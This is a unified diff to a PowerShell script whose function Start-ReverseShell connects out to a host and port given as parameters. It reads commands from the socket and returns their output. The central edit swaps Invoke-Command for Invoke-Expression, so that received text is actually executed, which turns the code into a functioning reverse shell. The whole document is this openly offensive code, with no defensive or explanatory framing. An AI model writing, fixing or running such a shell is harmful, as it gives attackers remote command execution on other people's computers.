@@ -1,12 +1,12 @@
 using namespace System.Text;
 using namespace System.Net.Sockets;
-
 Function Start-ReverseShell {
     param (
         [string]$IPAddr = "127.0.0.1" ,
         [string]$Port = "8080"
     )
     try {
+        
         # Create a TCP client and connect to the remote host
         $client = New-Object System.Net.Sockets.TCPClient($IPAddr, $Port)
         $stream = $client.GetStream()
@@ -22,7 +22,7 @@ Function Start-ReverseShell {
             # Convert the received bytes to a string
             $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $bytes.Length)
             try {
-                $sendback = Invoke-Command -ScriptBlock { $data } 2>&1 | Out-String;
+                $sendback = Invoke-Expression -Command $data 2>&1 | Out-String;
             }
             catch {
                 $sendback = $_.Exception.Message;
@@ -33,9 +33,10 @@ Function Start-ReverseShell {
             $stream.Write($sendbyte, 0, $sendbyte.Length)
             $stream.Flush()
         }
+        
     }
     catch {
-        Write-Host "Error: $_"
+        Write-Host "Error: $_";
     }
     finally {
         # Close the connection
